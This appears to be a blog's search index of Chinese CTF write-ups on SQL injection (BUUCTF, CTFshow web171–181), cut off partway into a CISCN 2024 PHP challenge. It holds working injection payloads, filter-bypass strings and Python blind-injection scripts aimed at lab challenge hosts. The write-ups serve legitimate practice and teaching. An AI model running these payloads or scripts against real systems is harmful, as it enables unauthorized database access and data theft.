<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BUUCTF</title>
    <url>/2024/08/09/BUUCTF/</url>
    <content><![CDATA[<h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>一个登录页面，应该要先注册进入</p>
<p>随便注册</p>
<p>进入发现可以修改密码 第一想法就是二次注入</p>
<h2 id="什么是二次注入"><a href="#什么是二次注入" class="headerlink" title="什么是二次注入"></a>什么是二次注入</h2><p>参考文章：<a href="https://www.cnblogs.com/jackie-lee/p/16124022.html">https://www.cnblogs.com/jackie-lee/p/16124022.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二次注入可以理解为，攻击者构造的恶意数据存储在数据库后，**恶意数据被读取并进入到SQL查询语句**所导致的注入。防御者即使对用户输入的恶意数据进行转义，当数据插入到数据库中时被处理的数据又被还原，Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。</span><br><span class="line"></span><br><span class="line">也就是说一次攻击造成不了什么，但是两次配合起来就会造成注入漏洞。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SQL二次注入，指的是在有些应用场景下，我们先把SQL注入的payload写入到目标站点数据库中，然后再在某些实际将该数据取出，使得我们写入的payload执行。</span><br><span class="line">因此，SQL二次注入一般分为2步，第一步即向目标站点的数据库中插入恶意数据，第二步即使得我们插入的恶意数据被目标站点所引用。</span><br><span class="line">SQL二次注入的实现，在第一步要求我们插入的恶意数据能够成功写入到目标站点的数据库中，站点可以对我们写入的恶意数据进行转义，但是数据本身不会被修改，也不会因为恶意的数据而拒绝我们的写入；第二步要求我们的恶意数据能够在某种应用场景下取出，并且不会对其站点内部的数据进行检验</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">所以也就是满足这两个条件即可</span><br><span class="line"></span><br><span class="line">用户向数据库插入恶意数据，即使后端对语句做了转义，如mysql_escape_string、mysql_real_escape_string等函数</span><br><span class="line"></span><br><span class="line">数据库能够将恶意数据取出</span><br></pre></td></tr></table></figure>



<p>这里情况相符</p>
<p>现在注册页面构造恶意的payload</p>
<p>fuzz发现uesrname这”没过滤</p>
<p>在注册账号这里username 这写入Gu0f3n”</p>
<p>修改密码这发现报错</p>
<p>猜测语句为</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span>&quot;Gu0f3n&quot; &quot; and password=&#x27; 5134f78f6e827c2a7e8767020cf23cbf&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>双引号闭合有报错</p>
<p>尝试报错注入</p>
<p>||用来拼接 发现空格 &#x2F;**&#x2F;同时被过滤了括号绕过空格</p>
<p>直接查表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</span><br></pre></td></tr></table></figure>

<p>XPATH syntax error: ‘:article,flag,users’</p>
<p>查列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))),1))#</span><br></pre></td></tr></table></figure>

<p>XPATH syntax error: ‘:flag’</p>
<p>flag在user表里</p>
<p>这里有个坑</p>
<p>因为限制长度所以列名没有显示清楚regexp(‘’^r’)</p>
<p>用来把想要的列名筛选出来and被过滤了用&amp;&amp;</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;(column_name)regexp(&#x27;^r&#x27;))),1))#</span><br><span class="line">#XPATH syntax error: &#x27;real_flag_1s_here&#x27;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;))),1))#</span><br></pre></td></tr></table></figure>

<p>XPATH syntax error: ‘:name,pwd,email,real_flag_1s_here’</p>
<p><code>regexp</code> 是一个正则表达式匹配操作符，通常用于检查某个字符串是否符合指定的正则表达式模式。</p>
<p>整个 <code>regexp(&#39;^f&#39;)</code> 的作用是筛选出 <strong>以字母 <code>f</code> 开头的值</strong>。<code>^</code>：表示匹配字符串的开始</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))),1))#</span><br></pre></td></tr></table></figure>

<p>XPATH syntax error: ‘~flag{24b07aef-f8cc-4348-a482-12’</p>
<p>过滤了substr mid 等函数 用reverse函数</p>
<p>反转即可<a href="https://tool.box3.cn/reverse.html">https://tool.box3.cn/reverse.html</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=Gu0f3n&quot;||(updatexml(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)))),1))#</span><br></pre></td></tr></table></figure>

<p>XPATH syntax error: ‘~}c4d832e9db21-284a-8434-cc8f-fe’</p>
<p>反转拼接即可</p>
<p>flag{24b07aef-f8cc-4348-a482-12bd9e238d4c}</p>
<p>重开靶机用脚本试试</p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url_reg = <span class="string">&#x27;http://3c31d529-aa22-4bca-88f5-3fa5d38b3a16.node5.buuoj.cn:81//register.php&#x27;</span></span><br><span class="line">url_log = <span class="string">&#x27;http://3c31d529-aa22-4bca-88f5-3fa5d38b3a16.node5.buuoj.cn:81//login.php&#x27;</span></span><br><span class="line">url_change = <span class="string">&#x27;http://3c31d529-aa22-4bca-88f5-3fa5d38b3a16.node5.buuoj.cn:81//changepwd.php&#x27;</span></span><br><span class="line"></span><br><span class="line">pre = <span class="string">&#x27;Gu0f3n&quot;&#x27;</span></span><br><span class="line"><span class="comment"># 逆序闭合</span></span><br><span class="line">suf = <span class="string">&quot;&#x27;)))),1))#&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正序闭合</span></span><br><span class="line"><span class="comment"># suf = &quot;&#x27;))),1))#&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890&#x27;</span></span><br><span class="line">s = <span class="built_in">list</span>(s)</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">name</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: name,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;email&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r.post(url=url_reg, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">name</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: name,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    r.post(url=url_log, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">changepwd</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;oldpass&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;newpass&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    kk = r.post(url=url_change, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;XPATH&#x27;</span> <span class="keyword">in</span> kk.text:</span><br><span class="line">        <span class="built_in">print</span>(kk.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="comment"># 正序</span></span><br><span class="line">    <span class="comment"># paylaod = pre + &quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot; + i + suf</span></span><br><span class="line">    <span class="comment"># 逆序</span></span><br><span class="line">    paylaod = pre + <span class="string">&quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot;</span> + i + suf</span><br><span class="line">    register(paylaod)</span><br><span class="line">    login(paylaod)</span><br><span class="line">    changepwd()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 正序payload</span></span><br><span class="line"><span class="comment"># paylaod = pre + &quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot; + i + &quot;&#x27;))),1))#&quot;</span></span><br><span class="line"><span class="comment"># 逆序payload</span></span><br><span class="line"><span class="comment"># paylaod = pre + &quot;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;&quot; + i + &quot;&#x27;)))),1))#&quot;</span></span><br></pre></td></tr></table></figure>

<p>先正序在逆序</p>
<p>之后拼接一下就可以出</p>
<p>flag{95001f84-9ad6-499b-9a06-9c0d2e6b8d4c}</p>
<h2 id="October-2019-Twice-SQL-Injection"><a href="#October-2019-Twice-SQL-Injection" class="headerlink" title="October 2019 Twice SQL Injection"></a>October 2019 Twice SQL Injection</h2><p>二次注入 </p>
<p>简介这有回显</p>
<p>原理一样，注册页面没有过滤 直接盲猜表和列为flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27; union select flag from flag#</span><br></pre></td></tr></table></figure>

<p>flag{77a8ffbc-ad0e-4968-be7e-4c81898910a6}</p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><p><strong>注入点在password</strong> </p>
<p>替换为空的是select union or </p>
<p>正常注入即可</p>
]]></content>
      <categories>
        <category>sql刷题笔记</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFshow</title>
    <url>/2024/08/08/CTFSHOW/</url>
    <content><![CDATA[<h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>查询语句</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//拼接sql语句查找指定ID用户</span><br><span class="line">$sql = &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure>

<p>给了源码</p>
<p>闭合单引号 而且字段可以直接看出三列</p>
<p>爆库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure>

<p>ctfshow_web</p>
<p>分析下给的源码</p>
<ol>
<li><strong>选择字段</strong><ul>
<li><code>select username, password</code>: 选择<code>user</code>表中的<code>username</code>和<code>password</code>列。</li>
</ul>
</li>
<li><strong>指定表</strong><ul>
<li><code>from user</code>: 指定查询的数据表为<code>user</code>。</li>
</ul>
</li>
<li><strong>条件</strong><ul>
<li><code>where username !=&#39;flag&#39;</code>: 条件是<code>username</code>不等于<code>&#39;flag&#39;</code>。这确保查询结果中不包含用户名为<code>flag</code>的记录。</li>
<li><code>and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39;</code>: 条件是<code>id</code>等于从URL参数<code>id</code>获取的值。</li>
</ul>
</li>
<li><strong>限制结果</strong><ul>
<li><code>limit 1</code>: 限制查询结果最多返回一条记录。</li>
</ul>
</li>
</ol>
<p>参数可控可以猜测用户名为flag的用户就是我们的答案</p>
<p>万能密码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure>

<p>也可以or截断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; or username = &#x27;flag</span><br></pre></td></tr></table></figure>

<p>ctfshow{1ae89b71-537e-4704-9493-f90aa665f1c0}</p>
<h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><p>查看源码</p>
<p>看到select.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">layui.<span class="title function_">use</span>(<span class="string">&#x27;form&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> form = layui.<span class="property">form</span>;</span><br><span class="line">  form.<span class="title function_">on</span>(<span class="string">&#x27;submit(*)&#x27;</span>, <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> id = data.<span class="property">field</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">var</span> table = layui.<span class="property">table</span>;</span><br><span class="line">    table.<span class="title function_">reload</span>(<span class="string">&#x27;user_table&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">url</span>: <span class="string">&#x27;api/?id=&#x27;</span> + id</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">// 阻止表单默认提交行为</span></span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li>**<code>form.on(&#39;submit(\*)&#39;, function(data)&#123; ... &#125;)</code>**：监听表单提交事件，获取表单字段中的<code>id</code>值，并重新加载表格数据。</li>
</ul>
<p>注入点为id字段 单引号闭合</p>
<p>尝试上一关的payload</p>
<p>{“id”:”26”,”username”:”flag”,”password”:”flag_not_here”}]}</p>
<p>发现不在这</p>
<p>老实注</p>
<p>字段为3位</p>
<p>爆库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure>

<p>{“id”:”1”,”username”:”ctfshow_web”,”password”:”3”}]}</p>
<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>

<p>{“id”:”1”,”username”:”ctfshow_user,ctfshow_user2”,”password”:”3”}]}</p>
<p>password表没东西</p>
<p>ctfshow_user,ctfshow_user2的列一样</p>
<p>id,username,password</p>
<p>爆值</p>
<p>在第二张表里</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,group_concat(id,username,password),3 from ctfshow_user2--+</span><br></pre></td></tr></table></figure>

<p>ctfshow{b7520f1e-a489-493c-aabb-e1e978bae8cc}</p>
<h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>依旧是在api这个接口</p>
<p>多了一张表3其余和上一关一样</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">api/?id=1&#x27; union select 1,group_concat(id,username,password),3 from ctfshow_user3--+</span><br></pre></td></tr></table></figure>

<h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><p>这里在api路由这里没回显</p>
<p>直接看无过滤注入4模块</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/flag|[0-9]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>有过滤的字符型注入，更改正则表达式 <code>/flag|[0-9]/i</code>，返回结果中不能有数字</p>
<p>考虑盲注</p>
<p>抓包接口是api&#x2F;v4.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;lbw&#x27;,&#x27;xyz&#x27;) %23</span><br></pre></td></tr></table></figure>

<p>这里稍稍解释下吧</p>
<p>编写盲注脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取常量</span></span><br><span class="line">PAYLOAD_TEMPLATE = <span class="string">&quot;0&#x27; union select &#x27;a&#x27;,if(ascii(substr((select password from ctfshow_user4 where username=&#x27;flag&#x27;), &#123;&#125;,1))&gt;&#123;&#125;,&#x27;lbw&#x27;,&#x27;xyz&#x27;) %23&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://d0a608fb-8c33-4e69-abbc-5429035225b4.challenge.ctf.show/api/v4.php?id=&quot;</span></span><br><span class="line">ASCII_START = <span class="number">32</span></span><br><span class="line">ASCII_END = <span class="number">127</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test_chr</span>(<span class="params">index: <span class="built_in">int</span>, offset: <span class="built_in">int</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    response = requests.get(URL + PAYLOAD_TEMPLATE.<span class="built_in">format</span>(index, offset))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;lbw&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;xyz&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Unexpected response content&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_flag</span>() -&gt; <span class="built_in">str</span>:</span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        start, end = ASCII_START, ASCII_END</span><br><span class="line">        <span class="keyword">while</span> start &lt; end:</span><br><span class="line">            point = (start + end) // <span class="number">2</span></span><br><span class="line">            <span class="keyword">if</span> test_chr(index, point):</span><br><span class="line">                start = point + <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                end = point</span><br><span class="line">        flag += <span class="built_in">chr</span>(end)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">        <span class="comment"># 假设我们知道flag的结束字符，这里可以设置退出条件</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(flag) &gt; <span class="number">50</span>:  <span class="comment"># 这个条件可以根据实际情况调整</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    final_flag = find_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final flag: <span class="subst">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment">#ctfshow&#123;fe9a4453-ad08-4e6f-a83c-bcc2aa982a77&#125;</span></span><br></pre></td></tr></table></figure>

<p>ctfshow{fe9a4453-ad08-4e6f-a83c-bcc2aa982a77}</p>
<h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>

<p>也就是说什么都不会返回</p>
<p>考虑时间盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; and sleep(2) %23</span><br></pre></td></tr></table></figure>

<p>可行</p>
<p>上一关步骤一样</p>
<p>编写脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常量</span></span><br><span class="line">CHAR_SET = <span class="string">&#x27;1234567890-_&#123;&#125;qwertyuiopasdfghjklzxcvbnm&#x27;</span>  <span class="comment"># 字符集</span></span><br><span class="line">BASE_URL = <span class="string">&#x27;http://80f58198-ee06-4a46-a2cc-3f2aea94e556.challenge.ctf.show/api/v5.php?id=&#123;&#125;&amp;page=1&amp;limit=1&#x27;</span></span><br><span class="line">DELAY_THRESHOLD = <span class="number">2</span>  <span class="comment"># 延迟时间（秒）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_correct_char</span>(<span class="params">position: <span class="built_in">int</span>, char: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;判断指定字符是否在特定位置&quot;&quot;&quot;</span></span><br><span class="line">    sql_payload = <span class="string">&quot;1&#x27; and if(substr((select password from ctfshow_user5 where username=&#x27;flag&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;,sleep(&#123;&#125;),0) %23&quot;</span>.<span class="built_in">format</span>(position, char, DELAY_THRESHOLD)</span><br><span class="line">    url = BASE_URL.<span class="built_in">format</span>(sql_payload)</span><br><span class="line">    start_time = time.time()</span><br><span class="line">    requests.get(url)</span><br><span class="line">    elapsed_time = time.time() - start_time</span><br><span class="line">    <span class="keyword">return</span> elapsed_time &gt;= DELAY_THRESHOLD</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_flag</span>(<span class="params">max_length: <span class="built_in">int</span> = <span class="number">64</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;逐字符地提取 flag&quot;&quot;&quot;</span></span><br><span class="line">    extracted_flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, max_length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> CHAR_SET:</span><br><span class="line">            <span class="keyword">if</span> is_correct_char(pos, char):</span><br><span class="line">                extracted_flag += char</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[*] Extracted flag so far: <span class="subst">&#123;extracted_flag&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> extracted_flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    final_flag = extract_flag()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final extracted flag: <span class="subst">&#123;final_flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="comment">#ctfshow&#123;7b9f5582-39db-4e99-bed6-9da1772ed2ba&#125;</span></span><br></pre></td></tr></table></figure>

<p>ctfshow{7b9f5582-39db-4e99-bed6-9da1772ed2ba}</p>
<h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>过滤了union select </p>
<p>大小写绕过</p>
<p>万能密码可以直接绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; Union Select 1,password,3 from ctfshow_user --+</span><br></pre></td></tr></table></figure>

<p>ctfshow{939338e1-d47c-461b-bc76-f4e60435ae80}</p>
<h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure>

<p>过滤空格 而且 –+，#应该也过滤了</p>
<p>&#x2F;**&#x2F; %23</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,group_concat(password),3/**/from/**/ctfshow_user%23</span><br></pre></td></tr></table></figure>

<h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>依旧可行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure>

<p>增加了<code>/**/</code>的过滤</p>
<p>可以这些绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">回车(%0a) `(tab键上面的按钮)(%09) tab 和  %0b %0c %0d %a0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%0aunion%0aselect%0a1,password,3%0afrom%0actfshow_user%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;%09union%09select%091,password,3%09from%09ctfshow_user%23</span><br></pre></td></tr></table></figure>

<p>ctfshow{a2e33152-7f53-4000-b89b-972b5fc739a2}</p>
<h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1%23</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%0c可以用</span><br><span class="line">1&#x27;union%0cselect%0c1,password,3%0cfrom%0cctfshow_user%23</span><br></pre></td></tr></table></figure>

<h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>还是过滤空格 只不过这次加了对 <code>#</code>(<code>%23</code>) 的过滤</p>
<p>万能密码依旧能打</p>
<p>只不过需要</p>
<p>这里使用 <code>--</code>(–后加个空格) 绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1--%0c</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;union%0cselect%0c1,password,3%0cfrom%0cctfshow_user--%0c</span><br></pre></td></tr></table></figure>

<p>ctfshow{94f1ba08-b230-4dda-9a6a-eeaac94caef2}</p>
<h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><p>继续造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;||1--%0c</span><br></pre></td></tr></table></figure>

<p>返回逻辑</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//对传入的参数进行了过滤</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">  &#125;</span><br><span class="line">      </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>sql刷题笔记</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Ciscn2024web复现</title>
    <url>/2024/07/30/Ciscn2024web%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html/&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$cmd</span> = <span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); </span><br><span class="line">   <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span 